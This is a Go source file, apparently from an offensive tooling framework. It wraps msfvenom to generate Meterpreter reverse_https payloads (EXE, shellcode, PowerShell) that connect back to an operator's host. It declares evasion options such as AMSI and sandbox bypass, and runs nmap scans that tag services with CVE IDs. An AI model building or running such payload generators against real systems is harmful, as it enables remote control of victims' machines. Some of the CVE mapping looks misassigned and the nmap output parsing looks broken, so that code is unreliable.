package payload

import (
	"bufio"
	"context"
	"fmt"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

// PayloadType supported types
const (
	TypeWindowsEXE  = "windows_exe"
	TypeWindowsDLL  = "windows_dll"
	TypeLinuxELF    = "linux_elf"
	TypeMacOS       = "macos"
	TypeShellcode   = "shellcode"
	TypeHTA         = "hta"
	TypePowerShell  = "powershell"
)

// EvasionOptions for payload generation
type EvasionOptions struct {
	SleepObfuscation bool   `json:"sleep_obfuscation"`
	SandboxEvasion   bool   `json:"sandbox_evasion"`
	AMSIBypass      bool   `json:"amsi_bypass"`
	Arch            string `json:"arch"`
	Encoder         string `json:"encoder"`
}

// Generator orchestrates payload creation via msfvenom, Sliver, etc.
type Generator struct {
	msfvenomPath string
	outputDir    string
}

// NewGenerator creates payload generator
func NewGenerator(msfvenomPath, outputDir string) *Generator {
	if msfvenomPath == "" {
		msfvenomPath = "msfvenom"
	}
	if outputDir == "" {
		outputDir = "./payloads"
	}
	return &Generator{msfvenomPath: msfvenomPath, outputDir: outputDir}
}

// GenerateRequest payload generation request
type GenerateRequest struct {
	Type       string
	LHOST      string
	LPORT      int
	Format     string
	Evasion    *EvasionOptions
	OutputName string
}

// GenerateResult result
type GenerateResult struct {
	Path     string
	Size     int64
	Checksum string
	Duration time.Duration
	Error    string
}

// Generate creates payload via msfvenom
func (g *Generator) Generate(ctx context.Context, req *GenerateRequest) (*GenerateResult, error) {
	start := time.Now()
	outPath := filepath.Join(g.outputDir, req.OutputName)
	if outPath == g.outputDir {
		outPath = filepath.Join(g.outputDir, fmt.Sprintf("payload_%d", time.Now().Unix()))
	}

	var args []string
	switch req.Type {
	case TypeWindowsEXE:
		args = []string{
			"-p", "windows/x64/meterpreter/reverse_https",
			"LHOST=" + req.LHOST,
			fmt.Sprintf("LPORT=%d", req.LPORT),
			"-f", "exe",
			"-o", outPath,
		}
	case TypeShellcode:
		args = []string{
			"-p", "windows/x64/meterpreter/reverse_https",
			"LHOST=" + req.LHOST,
			fmt.Sprintf("LPORT=%d", req.LPORT),
			"-f", "c",
			"-o", outPath,
		}
	case TypePowerShell:
		args = []string{
			"-p", "windows/x64/meterpreter/reverse_https",
			"LHOST=" + req.LHOST,
			fmt.Sprintf("LPORT=%d", req.LPORT),
			"-f", "psh",
			"-o", outPath,
		}
	default:
		return &GenerateResult{Error: "unsupported payload type"}, nil
	}

	if req.Evasion != nil && req.Evasion.Encoder != "" {
		args = append(args, "-e", req.Evasion.Encoder)
	}

	cmd := exec.CommandContext(ctx, g.msfvenomPath, args...)
	output, err := cmd.CombinedOutput()
	duration := time.Since(start)
	if err != nil {
		return &GenerateResult{
			Error:    string(output) + err.Error(),
			Duration: duration,
		}, nil
	}

	return &GenerateResult{
		Path:     outPath,
		Duration: duration,
	}, nil
}

// VulnScanConfig for vulnerability scanning
type VulnScanConfig struct {
	Targets  []string
	Ports    []int
	ScanType string // quick, full
}

// VulnScanResult single finding
type VulnScanResult struct {
	Target   string   `json:"target"`
	Port     int      `json:"port"`
	Service  string   `json:"service"`
	Banner   string   `json:"banner"`
	Possible []string `json:"possible"`
}

// VulnScanner performs vulnerability scanning
type VulnScanner struct {
	nmapPath string
}

// NewVulnScanner creates vulnerability scanner
func NewVulnScanner(nmapPath string) *VulnScanner {
	if nmapPath == "" {
		nmapPath = "nmap"
	}
	return &VulnScanner{nmapPath: nmapPath}
}

// Scan runs nmap vulnerability scan
func (s *VulnScanner) Scan(ctx context.Context, cfg *VulnScanConfig) ([]VulnScanResult, error) {
	if len(cfg.Targets) == 0 {
		return nil, fmt.Errorf("no targets specified")
	}

	ports := intSliceToString(cfg.Ports)
	portsStr := strings.Join(ports, ",")
	if portsStr == "" {
		portsStr = "22,80,443,445,3389,8080,8443"
	}

	args := []string{"-sV", "-p", portsStr, "-T4"}
	
	switch cfg.ScanType {
	case "full":
		args = append(args, "-sC")
	case "quick":
		// quick mode - just version detection
	default:
		// default scan
	}
	
	args = append(args, cfg.Targets...)

	cmd := exec.CommandContext(ctx, s.nmapPath, args...)
	output, err := cmd.Output()
	if err != nil {
		return nil, fmt.Errorf("nmap failed: %w", err)
	}

	return s.parseNmapOutput(string(output)), nil
}

func (s *VulnScanner) parseNmapOutput(output string) []VulnScanResult {
	var results []VulnScanResult
	scanner := bufio.NewScanner(strings.NewReader(output))

	var currentHost string

	for scanner.Scan() {
		line := scanner.Text()
		
		// Parse host
		if strings.Contains(line, "Nmap scan report for") {
			parts := strings.Fields(line)
			if len(parts) >= 5 {
				currentHost = parts[4]
			}
		}
		
		// Parse port info
		if strings.HasPrefix(strings.TrimSpace(line), "Ports:") {
			// Parse port details
			portStr := strings.TrimPrefix(line, "Ports:")
			portParts := strings.Split(portStr, ",")
			for _, pp := range portParts {
				pp = strings.TrimSpace(pp)
				if strings.Contains(pp, "/open") {
					fields := strings.Fields(pp)
					if len(fields) >= 2 {
						port, _ := strconv.Atoi(strings.Split(fields[0], "/")[0])
						service := fields[len(fields)-1]
						
						results = append(results, VulnScanResult{
							Target:   currentHost,
							Port:     port,
							Service:  service,
							Possible: s.GetCommonVulns(service, ""),
						})
					}
				}
			}
		}
	}
	
	return results
}

func intSliceToString(slice []int) []string {
	result := make([]string, len(slice))
	for i, v := range slice {
		result[i] = strconv.Itoa(v)
	}
	return result
}

// GetCommonVulns returns common CVEs for a service
func (s *VulnScanner) GetCommonVulns(service, version string) []string {
	vulns := map[string][]string{
		"ssh":       {"CVE-2023-48795", "CVE-2020-15778"},
		"http":      {"CVE-2023-44487", "CVE-2023-32315"},
		"apache":    {"CVE-2023-25532", "CVE-2022-31813"},
		"nginx":     {"CVE-2023-44487", "CVE-2022-2509"},
		"smb":       {"CVE-2017-0143", "CVE-2017-0144"},
		"rdp":       {"CVE-2019-0708", "CVE-2020-0612"},
		"mysql":     {"CVE-2021-43297", "CVE-2021-44228"},
		"postgres":  {"CVE-2024-1597", "CVE-2023-2454"},
		"redis":    {"CVE-2023-22476", "CVE-2022-0546"},
		"mongodb":  {"CVE-2023-0340", "CVE-2021-41524"},
	}

	service = strings.ToLower(service)
	for key, values := range vulns {
		if strings.Contains(service, key) {
			return values
		}
	}

	return nil
}
